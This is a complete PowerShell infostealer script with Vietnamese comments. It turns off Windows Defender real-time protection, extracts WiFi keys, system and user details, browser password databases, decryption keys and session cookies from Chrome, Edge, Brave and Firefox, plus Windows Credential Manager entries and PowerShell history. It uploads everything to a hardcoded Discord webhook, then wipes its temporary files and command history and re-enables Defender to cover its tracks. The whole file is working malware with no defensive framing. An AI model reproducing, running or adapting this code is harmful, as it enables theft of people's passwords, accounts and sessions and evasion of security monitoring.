#-- Payload configuration --#

$WEBHOOK_URL = 'https://discord.com/api/webhooks/1479100377625399358/JbkoOkNwYnhMNSBvcrvdIYDI5mSFR_qW_bD_QMDgpmwmipl4TX_B3R_xucnpXWKNx_Hj'

# Tắt Windows Defender
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue

# Tạo thư mục tạm
$tempDir = "$env:TEMP\Exfil_$env:USERNAME"
if (-Not (Test-Path $tempDir)) {
    New-Item -ItemType Directory -Path $tempDir -Force
}

# ==========================================
# DISCORD WEBHOOK FUNCTIONS
# ==========================================

function Send-DiscordMessage {
    param([string]$Message)
    try {
        $payload = @{ content = $Message } | ConvertTo-Json
        Invoke-RestMethod -Uri $WEBHOOK_URL -Method Post -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue
    } catch {}
}

function Send-DiscordFile {
    param([string]$FilePath, [string]$Description = "")
    
    if (-Not (Test-Path $FilePath)) { return }
    
    $fileSize = (Get-Item $FilePath).Length
    if ($fileSize -gt 25MB) {
        $compressedPath = "$env:TEMP\compressed_$(Split-Path $FilePath -Leaf).zip"
        Compress-Archive -Path $FilePath -DestinationPath $compressedPath -CompressionLevel Optimal -Force
        $FilePath = $compressedPath
    }
    
    try {
        $fileName = Split-Path $FilePath -Leaf
        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
        $base64Content = [Convert]::ToBase64String($fileBytes)
        
        $payload = @{
            content = $Description
            files = @(
                @{
                    name = $fileName
                    content = $base64Content
                }
            )
        } | ConvertTo-Json -Depth 10
        
        Invoke-RestMethod -Uri $WEBHOOK_URL -Method Post -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue
    } catch {}
}

# ==========================================
# HÀM COPY FILE AN TOÀN (XỬ LÝ FILE BỊ LOCK)
# ==========================================
function Safe-CopyFile {
    param([string]$Source, [string]$Destination)
    
    if (-not (Test-Path $Source)) { 
        Write-Host "[-] Not found: $Source"
        return $false 
    }
    
    try {
        # Thử copy bình thường
        Copy-Item -Path $Source -Destination $Destination -Force -ErrorAction Stop
        Write-Host "[+] Copied: $(Split-Path $Destination -Leaf)"
        return $true
    } catch {
        # Nếu lỗi do lock, dùng cmd copy
        Write-Host "[!] File locked, trying alternative: $(Split-Path $Source -Leaf)"
        $tempFile = "$env:TEMP\$([Guid]::NewGuid()).tmp"
        cmd /c "copy `"$Source`" `"$tempFile`"" 2>nul
        if (Test-Path $tempFile) {
            Copy-Item $tempFile $Destination -Force
            Remove-Item $tempFile -Force
            return $true
        }
        return $false
    }
}

# ==========================================
# BẮT ĐẦU ĐÁNH CẮP
# ==========================================

Send-DiscordMessage "🎯 **TARGET: $env:COMPUTERNAME - $env:USERNAME**"
Start-Sleep -Seconds 1

# 1. Lấy mật khẩu WiFi (cải thiện)
Send-DiscordMessage "📡 **Extracting WiFi passwords...**"
netsh wlan export profile key=clear folder="$tempDir" > $null
# Gộp tất cả XML thành 1 file text dễ đọc
$wifiFile = "$tempDir\WiFi_Details.txt"
"="*60 | Out-File $wifiFile
"WiFi Passwords for $env:COMPUTERNAME" | Out-File $wifiFile -Append
"Extracted on: $(Get-Date)" | Out-File $wifiFile -Append
"="*60 | Out-File $wifiFile -Append
"" | Out-File $wifiFile -Append

Get-ChildItem "$tempDir\*.xml" | ForEach-Object {
    $content = Get-Content $_.FullName -Raw
    if ($content -match '<name>(.+?)</name>') { $ssid = $matches[1] }
    if ($content -match '<keyMaterial>(.+?)</keyMaterial>') { $pass = $matches[1] }
    else { $pass = "No password (Open network)" }
    "[$ssid] $pass" | Out-File $wifiFile -Append
}
Send-DiscordFile -FilePath $wifiFile -Description "📡 WiFi Passwords"

# 2. Lấy thông tin hệ thống (cải thiện)
Send-DiscordMessage "💻 **Collecting system information...**"
$sysFile = "$tempDir\SystemInfo.txt"
"System Information for $env:COMPUTERNAME" | Out-File $sysFile
"="*60 | Out-File $sysFile -Append
Get-ComputerInfo | Out-File $sysFile -Append
"" | Out-File $sysFile -Append
"Local Users:" | Out-File $sysFile -Append
"-"*30 | Out-File $sysFile -Append
Get-LocalUser | Where-Object { $_.Enabled } | Out-File $sysFile -Append
Send-DiscordFile -FilePath $sysFile -Description "💻 System Information"

# 3. Google Chrome (ĐÃ SỬA - thêm Local State và xử lý lock)
Send-DiscordMessage "🌐 **Extracting Chrome credentials...**"
$chromeDir = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
$chromeDest = "$tempDir\Chrome"
New-Item -ItemType Directory -Path $chromeDest -Force

# Copy Login Data (xử lý lock)
Safe-CopyFile "$chromeDir\Login Data" "$chromeDest\Login Data"
# Copy Local State (QUAN TRỌNG - để giải mã)
Safe-CopyFile "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State" "$chromeDest\Local State"
# Copy Cookies (thêm để ăn cắp session)
Safe-CopyFile "$chromeDir\Cookies" "$chromeDest\Cookies"

if ((Get-ChildItem $chromeDest -File).Count -gt 0) {
    # Nén lại trước khi gửi
    $chromeZip = "$env:TEMP\Chrome_Data.zip"
    Compress-Archive -Path "$chromeDest\*" -DestinationPath $chromeZip -Force
    Send-DiscordFile -FilePath $chromeZip -Description "🌐 Chrome Credentials (Login Data + Local State + Cookies)"
    Remove-Item $chromeZip -Force
}

# 4. Microsoft Edge (tương tự Chrome)
Send-DiscordMessage "🌐 **Extracting Edge credentials...**"
$edgeDir = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
$edgeDest = "$tempDir\Edge"
New-Item -ItemType Directory -Path $edgeDest -Force

Safe-CopyFile "$edgeDir\Login Data" "$edgeDest\Login Data"
Safe-CopyFile "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State" "$edgeDest\Local State"

if ((Get-ChildItem $edgeDest -File).Count -gt 0) {
    $edgeZip = "$env:TEMP\Edge_Data.zip"
    Compress-Archive -Path "$edgeDest\*" -DestinationPath $edgeZip -Force
    Send-DiscordFile -FilePath $edgeZip -Description "🌐 Edge Credentials (Login Data + Local State)"
    Remove-Item $edgeZip -Force
}

# 5. Brave Browser (THÊM MỚI)
Send-DiscordMessage "🌐 **Extracting Brave credentials...**"
$braveDir = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default"
if (Test-Path $braveDir) {
    $braveDest = "$tempDir\Brave"
    New-Item -ItemType Directory -Path $braveDest -Force
    
    Safe-CopyFile "$braveDir\Login Data" "$braveDest\Login Data"
    Safe-CopyFile "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Local State" "$braveDest\Local State"
    
    if ((Get-ChildItem $braveDest -File).Count -gt 0) {
        $braveZip = "$env:TEMP\Brave_Data.zip"
        Compress-Archive -Path "$braveDest\*" -DestinationPath $braveZip -Force
        Send-DiscordFile -FilePath $braveZip -Description "🌐 Brave Credentials (Login Data + Local State)"
        Remove-Item $braveZip -Force
    }
}

# 6. Firefox (ĐÃ SỬA - thêm key4.db)
Send-DiscordMessage "🦊 **Extracting Firefox credentials...**"
$firefoxProfile = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -Filter "*.default-release" | Select-Object -First 1
if ($firefoxProfile) {
    $firefoxDest = "$tempDir\Firefox"
    New-Item -ItemType Directory -Path $firefoxDest -Force
    
    # Copy logins.json (mật khẩu)
    Safe-CopyFile "$($firefoxProfile.FullName)\logins.json" "$firefoxDest\logins.json"
    # Copy key4.db (khóa giải mã) - QUAN TRỌNG
    Safe-CopyFile "$($firefoxProfile.FullName)\key4.db" "$firefoxDest\key4.db"
    # Copy cookies.sqlite (session)
    Safe-CopyFile "$($firefoxProfile.FullName)\cookies.sqlite" "$firefoxDest\cookies.sqlite"
    
    if ((Get-ChildItem $firefoxDest -File).Count -gt 0) {
        $firefoxZip = "$env:TEMP\Firefox_Data.zip"
        Compress-Archive -Path "$firefoxDest\*" -DestinationPath $firefoxZip -Force
        Send-DiscordFile -FilePath $firefoxZip -Description "🦊 Firefox Credentials (logins.json + key4.db)"
        Remove-Item $firefoxZip -Force
    }
}

# 7. Lấy thêm mật khẩu từ Windows Credential Manager (TÙY CHỌN)
Send-DiscordMessage "🔑 **Extracting Windows credentials...**"
$credFile = "$tempDir\Windows_Credentials.txt"
cmdkey /list | Out-File $credFile
Send-DiscordFile -FilePath $credFile -Description "🔑 Windows Credential Manager"

# 8. Lấy lịch sử PowerShell (dấu vết)
$psHistory = Get-PSReadLineOption -ErrorAction SilentlyContinue | Select-Object -ExpandProperty HistorySavePath
if ($psHistory -and (Test-Path $psHistory)) {
    Copy-Item $psHistory "$tempDir\PS_History.txt" -Force
    Send-DiscordFile -FilePath "$tempDir\PS_History.txt" -Description "📜 PowerShell History"
}

# ==========================================
# TỔNG KẾT
# ==========================================

# Tính tổng dung lượng
$totalSize = [math]::Round((Get-ChildItem $tempDir -Recurse -File | Measure-Object -Property Length -Sum).Sum / 1MB, 2)

Send-DiscordMessage "✅ **EXFILTRATION COMPLETED!**"
Send-DiscordMessage "📊 **Summary:**"
Send-DiscordMessage "- **Target:** $env:COMPUTERNAME"
Send-DiscordMessage "- **User:** $env:USERNAME"
Send-DiscordMessage "- **Size:** $totalSize MB"
Send-DiscordMessage "- **Time:** $(Get-Date -Format 'HH:mm:ss')"

# ==========================================
# DỌN DẸP
# ==========================================

# Xóa thư mục tạm
Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue

# Xóa lịch sử PowerShell hiện tại
Clear-History
Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue

# Bật lại Defender (che giấu)
Start-Sleep -Seconds 2
Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue

exit
